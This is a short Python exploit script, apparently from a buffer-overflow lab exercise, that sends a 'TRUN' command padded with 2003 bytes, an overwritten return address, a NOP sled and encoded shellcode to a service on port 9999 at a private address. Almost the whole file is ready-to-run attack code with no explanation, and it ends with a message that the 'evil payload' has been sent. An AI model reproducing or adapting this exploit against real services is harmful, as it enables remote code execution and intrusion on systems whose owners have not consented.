#!/usr/bin/python
import socket, sys, struct, time, os
from time import sleep

host = "10.10.149.91"
port = 9999

As = b"A" * 2003 
#eip = struct.pack("<I", 0x625011af)	#eip = 625011af
eip = b"\xaf\x11\x50\x62"

shellcode =  b""
shellcode += b"\xba\xaa\xb8\x25\x5d\xda\xc6\xd9\x74\x24\xf4"
shellcode += b"\x58\x29\xc9\xb1\x5e\x31\x50\x15\x83\xe8\xfc"
shellcode += b"\x03\x50\x11\xe2\x5f\x44\xcd\xd2\x9f\xb5\x0e"
shellcode += b"\x8d\xae\x67\x6a\xc6\x82\xb7\xf8\x8a\x2e\x33"
shellcode += b"\xac\x3e\xa7\xa6\xda\x4d\x9f\x27\x6a\xfb\xf9"
shellcode += b"\x06\x6b\xcd\xc5\xc5\xaf\x4f\xb9\x17\xfc\xaf"
shellcode += b"\x80\xd7\xf1\xae\xc5\xa1\x7c\x5e\x9b\xba\x2d"
shellcode += b"\xb0\x4c\x36\x93\x8c\x73\x98\x9f\xad\x0b\x9d"
shellcode += b"\x60\x59\xa7\x9c\xb0\x29\x7f\x87\x60\xa5\x27"
shellcode += b"\x97\x81\x6a\x52\x1e\xf5\xb0\x15\x90\x09\x43"
shellcode += b"\x91\x59\xf4\x82\xe8\x9d\x36\xe5\x07\xb2\xb8"
shellcode += b"\x3d\x2f\x2a\xcf\x35\x4c\xd7\xc8\x8d\x2f\x03"
shellcode += b"\x5c\x12\x97\xc0\xc6\xf6\x26\x04\x90\x7d\x24"
shellcode += b"\xe1\xd6\xda\x28\xf4\x3b\x51\x54\x7d\xba\xb6"
shellcode += b"\xdd\xc5\x99\x12\x86\x9e\x80\x03\x62\x70\xbc"
shellcode += b"\x54\xca\x2d\x18\x1e\xf8\x38\x1c\xdf\x03\x45"
shellcode += b"\x40\x48\xc8\x88\x7b\x88\x46\x9a\x08\xba\xc9"
shellcode += b"\x30\x87\xf6\x82\x9e\x50\x8e\x84\x20\x8e\x28"
shellcode += b"\xc4\xde\x2f\x49\xcd\x24\x7b\x19\x65\x8c\x04"
shellcode += b"\xf2\x75\x31\xd1\x6f\x7f\xa5\xd0\x64\x34\x64"
shellcode += b"\x8d\x78\xca\x97\x11\xf4\x2c\xc7\xf9\x56\xe0"
shellcode += b"\xa8\xa9\x16\x50\x41\xa0\x98\x8f\x71\xcb\x72"
shellcode += b"\xb8\x18\x24\x2b\x91\xb4\xdd\x76\x69\x24\x21"
shellcode += b"\xad\x14\x66\xa9\x44\xe9\x29\x5a\x2c\xf9\x5e"
shellcode += b"\x3d\xce\x01\x9f\xa8\xce\x6b\x9b\x7a\x98\x03"
shellcode += b"\xa1\x5b\xee\x8c\x5a\x8e\x6c\xca\xa5\x4f\x45"
shellcode += b"\xa1\x90\xc5\xe9\xdd\xdc\x09\xea\x1d\x8b\x43"
shellcode += b"\xea\x75\x6b\x30\xb9\x60\x74\xed\xad\x39\xe1"
shellcode += b"\x0e\x84\xee\xa2\x66\x2a\xc9\x85\x28\xd5\x3c"
shellcode += b"\x96\x2f\x29\xc3\xb1\x97\x42\x3b\x82\x27\x93"
shellcode += b"\x51\x02\x78\xfb\xae\x2d\x77\xcb\x4f\xe4\xd0"
shellcode += b"\x43\xda\x69\x92\xf2\xdb\xa3\x72\xab\xdc\x40"
shellcode += b"\xaf\x5c\xa7\x29\x50\x9d\x58\x20\x35\x9d\x59"
shellcode += b"\x4c\x4b\xa1\x8c\x75\x39\xe4\x0d\xc2\x22\xfb"
shellcode += b"\xbb\x3f\xcb\xa2\x2e\x82\x96\x54\x85\xc1\xae"
shellcode += b"\xd6\x2f\xba\x54\xc6\x5a\xbf\x11\x40\xb7\xcd"
shellcode += b"\x0a\x25\xb7\x62\x2a\x6c"



payload = As + eip + b"\x90" * 16 + shellcode

print(payload)

def main():
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,int(port)))
	#sleep(1)
	#s.send(payload)	
	s.send((b'TRUN /.:/' + payload))
	#sleep(1)
	s.close()
	print("[+] Evil payload of D00M.....has been sent !")

if __name__== "__main__":
	main()

  
  

